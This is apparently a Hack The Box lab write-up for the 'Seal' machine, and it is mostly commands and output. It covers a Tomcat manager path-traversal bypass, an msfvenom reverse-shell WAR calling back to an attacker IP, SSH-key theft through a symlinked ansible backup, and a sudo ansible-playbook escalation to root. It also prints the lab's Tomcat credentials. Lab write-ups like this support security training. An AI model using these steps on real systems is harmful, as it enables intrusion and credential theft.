# Seal

Completed: Yes Created: October 5, 2021 3:14 PM Platform: Hack The Box

## Enumeration

### Nmap

```bash
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
8080/tcp open  http-proxy
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.91%I=7%D=10/5%Time=615C41F6%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,F5,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Tue,\x2005\x2
SF:0Oct\x202021\x2012:15:50\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node01fqah
SF:uifucvy41r1xeticbz7de1\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Th
SF:u,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/htm
SF:l;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,108,"HT
SF:TP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2005\x20Oct\x202021\x2012:15:50\
SF:x20GMT\r\nSet-Cookie:\x20JSESSIONID=node01w7wpq3brr6yukmxa8nlftt1g2\.no
SF:de0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2
SF:000:00:00\x20GMT\r\nContent-Type:\x20text/html;charset=utf-8\r\nAllow:\
SF:x20GET,HEAD,POST,OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReques
SF:t,AD,"HTTP/1\.1\x20505\x20Unknown\x20Version\r\nContent-Type:\x20text/h
SF:tml;charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20close
SF:\r\n\r\n<h1>Bad\x20Message\x20505</h1><pre>reason:\x20Unknown\x20Versio
SF:n</pre>")%r(FourOhFourRequest,F5,"HTTP/1\.1\x20401\x20Unauthorized\r\nD
SF:ate:\x20Tue,\x2005\x20Oct\x202021\x2012:15:51\x20GMT\r\nSet-Cookie:\x20
SF:JSESSIONID=node017vixzbprzj6a19n9rd4zmuad93\.node0;\x20Path=/;\x20HttpO
SF:nly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nCont
SF:ent-Type:\x20text/html;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%
SF:r(Socks5,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x5\r\nCo
SF:ntent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\
SF:nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:
SF:\x20Illegal\x20character\x20CNTL=0x5</pre>")%r(Socks4,C3,"HTTP/1\.1\x20
SF:400\x20Illegal\x20character\x20CNTL=0x4\r\nContent-Type:\x20text/html;c
SF:harset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\
SF:r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x
SF:20CNTL=0x4</pre>")%r(RPCCheck,C7,"HTTP/1\.1\x20400\x20Illegal\x20charac
SF:ter\x20OTEXT=0x80\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nC
SF:ontent-Length:\x2071\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\
SF:x20400</h1><pre>reason:\x20Illegal\x20character\x20OTEXT=0x80</pre>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### https

`admin@seal.htb` in contacts.

/admin - error with `Apache Tomcat/9.0.31 (Ubuntu)`.

/manager - same.

With found creds in gitbucket repo, I successfully logged in by /manager/text url, but it said access is denied. So, I tried another one, /manager/status. And fortunately, bypass `ssl_client_verify` condition.

### port 8080

GitBucket.

Successfully registered with `hacker:hacker`. Access to `root / seal_market` repository.

Two users via issues:

* alex@seal.htb
* luis@seal.htb

Also, access to `root / infra` repository.

```
ToDo

    Remove mutual authentication for dashboard, setup registration and login features.
    Deploy updated tomcat configuration.
    Disable manager and host-manager.
```

nginx sites-enabled/default.conf:

```
ssl_certificate /var/www/keys/selfsigned.crt;
ssl_certificate_key /var/www/keys/selfsigned.key;
ssl_client_certificate /var/www/keys/selfsigned-ca.crt;
 
server {
	listen 443 ssl default_server;
	listen [::]:443 ssl default_server;
 
	# SSL configuration
	#
	# listen 443 ssl default_server;
	# listen [::]:443 ssl default_server;
	#
	# Note: You should disable gzip for SSL traffic.
	# See: https://bugs.debian.org/773332
	#
	# Read up on ssl_ciphers to ensure a secure configuration.
	# See: https://bugs.debian.org/765782
	#
	# Self signed certs generated by the ssl-cert package
	# Don't use them in a production server!
	#
	# include snippets/snakeoil.conf;
 
	root /var/www/html;
	ssl_protocols TLSv1.1 TLSv1.2;
	ssl_verify_client optional;
	
	# Add index.php to the list if you are using PHP
	index index.html index.htm index.nginx-debian.html;
 
	server_name _;
 
	location /manager/html {
		if ($ssl_client_verify != SUCCESS) {
			return 403;
		}
		proxy_set_header        Host $host;
		proxy_set_header        X-Real-IP $remote_addr;
		proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
		proxy_set_header        X-Forwarded-Proto $scheme;
		proxy_pass          http://localhost:8000;
		proxy_read_timeout  90;
		proxy_redirect      http://localhost:8000 https://0.0.0.0;
		# First attempt to serve request as file, then
		# as directory, then fall back to displaying a 404.
#		try_files $uri $uri/ =404;
	}
 
 
	location /admin/dashboard {
		if ($ssl_client_verify != SUCCESS) {
			return 403;
		}
		proxy_set_header        Host $host;
		proxy_set_header        X-Real-IP $remote_addr;
		proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
		proxy_set_header        X-Forwarded-Proto $scheme;
		proxy_pass          http://localhost:8000;
		proxy_read_timeout  90;
		proxy_redirect      http://localhost:8000 https://0.0.0.0;
		# First attempt to serve request as file, then
		# as directory, then fall back to displaying a 404.
#		try_files $uri $uri/ =404;
	}
 
        location /host-manager/html {
                if ($ssl_client_verify != SUCCESS) {
                        return 403;
                }
                proxy_set_header        Host $host;
                proxy_set_header        X-Real-IP $remote_addr;
                proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_set_header        X-Forwarded-Proto $scheme;
                proxy_pass          http://localhost:8000;
                proxy_read_timeout  90;
                proxy_redirect      http://localhost:8000 https://0.0.0.0;
                # First attempt to serve request as file, then
                # as directory, then fall back to displaying a 404.
#               try_files $uri $uri/ =404;
        }
 
 
	location / {
                proxy_set_header        Host $host;
                proxy_set_header        X-Real-IP $remote_addr;
                proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_set_header        X-Forwarded-Proto $scheme;
                proxy_pass          http://localhost:8000;
                proxy_read_timeout  90;
                proxy_redirect      http://localhost:8000 https://0.0.0.0;
	}
```

From here, we can see the template for mutual TLS authentication: [https://smallstep.com/hello-mtls/doc/server/nginx](https://smallstep.com/hello-mtls/doc/server/nginx).

Found deleted creds via the next commit: [http://seal.htb:8080/root/seal\_market/commit/971f3aa3f0a0cc8aac12fd696d9631ca540f44c7](http://seal.htb:8080/root/seal\_market/commit/971f3aa3f0a0cc8aac12fd696d9631ca540f44c7). `<user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"/>`. Also the password from tomcat works for luis user.

## Gaining access

In Tomcat, we can do nothing because of the Nginx config. Besides that, I found the solution with this question on Reddit: [https://www.reddit.com/r/HowToHack/comments/p9id2s/question\_about\_tomcat\_path\_traversal\_exploit/](https://www.reddit.com/r/HowToHack/comments/p9id2s/question\_about\_tomcat\_path\_traversal\_exploit/).

With something like \[`https://seal.htb/manager/status/](https://seal.htb/manager/status/)..;/html/` we can bypass nginx and go right to /manager/html. After that, we have an option to deploy our revshell as usual with msfvenom generation.

```bash
â”Œâ”€â”€(rootðŸ’€kali)-[/tmp]
â””â”€# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f war -o revshell.war
Payload size: 1083 bytes
Final size of war file: 1083 bytes
Saved as: revshell.war
```

When you do a deployment, don't forget to intercept the request with a burp and modify your URL or you will get 403 again. After deployment, go to /revshell and catch reverse shell:

```bash
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.250] 47402
whoami
tomcat
python3 -c 'import pty;pty.spawn("/bin/bash")' 
tomcat@seal:/var/lib/tomcat9$
```

## Privilege escalation

As user tomcat, I found this file:

```bash
tomcat@seal:/opt/backups/playbook$ cat run.yml
cat run.yml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
tomcat@seal:/opt/backups/playbook$
```

Also, in `ps aux` output:

```bash
root       58046  0.0  0.0   2608   540 ?        Ss   16:57   0:00      _ /bin/sh -c sleep 30 && sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
```

So, this file will be running as luis and it has an option `copy_links` which indicates, that it will copy symlinks too.

```bash
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ls -la
ls -la
total 8
drwxrwxrwx 2 root   root   4096 Oct  5 18:10 .
drwxr-xr-x 7 root   root   4096 May  7 09:26 ..
lrwxrwxrwx 1 tomcat tomcat   16 Oct  5 18:10 .ssh -> /home/luis/.ssh/
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ cd /tmp
cd /tmp
tomcat@seal:/tmp$ ls -la
ls -la
total 488
drwxrwxrwt  5 root   root     4096 Oct  5 18:16 .
drwxr-xr-x 20 root   root     4096 Jul 26 13:43 ..
drwxr-x---  2 tomcat tomcat   4096 Oct  5 18:16 archives
drwxr-x---  2 tomcat tomcat   4096 Oct  5 14:26 hsperfdata_tomcat
-rwxr-x---  1 tomcat tomcat 476162 Oct  2 18:23 linpeas.sh
drwx------  2 tomcat tomcat   4096 Oct  5 16:45 tmux-997
tomcat@seal:/tmp$ cp /opt/backups/archives/* .
cp /opt/backups/archives/* .
tomcat@seal:/tmp$ ls -la
ls -la
total 1084
drwxrwxrwt  5 root   root     4096 Oct  5 18:21 .
drwxr-xr-x 20 root   root     4096 Jul 26 13:43 ..
drwxr-x---  2 tomcat tomcat   4096 Oct  5 18:16 archives
-rw-r-----  1 tomcat tomcat 609572 Oct  5 18:21 backup-2021-10-05-18:20:32.gz
drwxr-x---  2 tomcat tomcat   4096 Oct  5 14:26 hsperfdata_tomcat
-rwxr-x---  1 tomcat tomcat 476162 Oct  2 18:23 linpeas.sh
drwx------  2 tomcat tomcat   4096 Oct  5 16:45 tmux-997
tomcat@seal:/tmp$ mv backup-2021-10-05-18:20:32.gz archives
mv backup-2021-10-05-18:20:32.gz archives
tomcat@seal:/tmp$ cd archives
cd archives
tomcat@seal:/tmp/archives$ ls -la
ls -la
total 2776
drwxr-x--- 2 tomcat tomcat    4096 Oct  5 18:21 .
drwxrwxrwt 5 root   root      4096 Oct  5 18:21 ..
-rw-r----- 1 tomcat tomcat  609572 Oct  5 18:21 backup-2021-10-05-18:20:32.gz
tomcat@seal:/tmp/archives$ mv backup-2021-10-05-18:20:32.gz ssh.gz
mv backup-2021-10-05-18:20:32.gz ssh.gz
tomcat@seal:/tmp/archives$ gzip -dk ssh.gz
gzip -dk ssh.gz
tomcat@seal:/tmp/archives$ tar -xvf ssh
tar -xvf ssh
dashboard/
dashboard/scripts/
dashboard/images/
dashboard/css/
dashboard/uploads/
dashboard/bootstrap/
dashboard/index.html
dashboard/scripts/flot/
dashboard/scripts/datatables/
dashboard/scripts/jquery-ui-1.10.1.custom.min.js
dashboard/scripts/common.js
dashboard/scripts/jquery-1.9.1.min.js
dashboard/scripts/flot/jquery.flot.resize.js
dashboard/scripts/flot/jquery.flot.pie.js
dashboard/scripts/flot/jquery.flot.js
dashboard/scripts/datatables/jquery.dataTables.js
dashboard/images/jquery-ui/
dashboard/images/icons/
dashboard/images/img.jpg
dashboard/images/user.png
dashboard/images/bg.png
dashboard/images/jquery-ui/picker.png
dashboard/images/icons/css/
dashboard/images/icons/font/
dashboard/images/icons/css/font-awesome.css
dashboard/images/icons/font/fontawesome-webfont3294.ttf
dashboard/images/icons/font/fontawesome-webfontd41d.eot
dashboard/images/icons/font/fontawesome-webfont3294.eot
dashboard/images/icons/font/fontawesome-webfont3294.woff
dashboard/css/theme.css
dashboard/uploads/.ssh/
dashboard/uploads/.ssh/id_rsa
dashboard/uploads/.ssh/id_rsa.pub
dashboard/uploads/.ssh/authorized_keys
dashboard/bootstrap/css/
dashboard/bootstrap/js/
dashboard/bootstrap/img/
dashboard/bootstrap/css/bootstrap-responsive.min.css
dashboard/bootstrap/css/bootstrap.min.css
dashboard/bootstrap/js/bootstrap.min.js
dashboard/bootstrap/img/glyphicons-halflings.png
dashboard/bootstrap/img/glyphicons-halflings-white.png
tomcat@seal:/tmp/archives$ ls -la
ls -la
total 2200
drwxr-x--- 3 tomcat tomcat    4096 Oct  5 18:22 .
drwxrwxrwt 5 root   root      4096 Oct  5 18:21 ..
drwxr-x--- 7 tomcat tomcat    4096 May  7 09:26 dashboard
-rw-r----- 1 tomcat tomcat 1628160 Oct  5 18:21 ssh
-rw-r----- 1 tomcat tomcat  609572 Oct  5 18:21 ssh.gz
tomcat@seal:/tmp/archives$ cd dashboard/uploads/.ssh/
cd dashboard/uploads/.ssh/
tomcat@seal:/tmp/archives/dashboard/uploads/.ssh$ ls -la
ls -la
total 20
drwx------ 2 tomcat tomcat 4096 May  7 06:10 .
drwxr-x--- 3 tomcat tomcat 4096 Oct  5 18:22 ..
-rw-r----- 1 tomcat tomcat  563 May  7 06:10 authorized_keys
-rw------- 1 tomcat tomcat 2590 May  7 06:10 id_rsa
-rw-r----- 1 tomcat tomcat  563 May  7 06:10 id_rsa.pub
```

Now, we have luis. he has an ansible-playbook in /etc/sudoers. ansible-playbook is in GTFObins. So, I just executed the commands from there:

```bash
luis@seal:~$ sudo -l
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
luis@seal:~$ cd /tmp
luis@seal:/tmp$ TF=$(mktemp)
luis@seal:/tmp$ echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
luis@seal:/tmp$ sudo ansible-playbook $TF
[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'

PLAY [localhost] ****************************************************************************************************************************************************************************************************************************

TASK [Gathering Facts] **********************************************************************************************************************************************************************************************************************
ok: [localhost]

TASK [shell] ********************************************************************************************************************************************************************************************************************************
# whoami
root
```
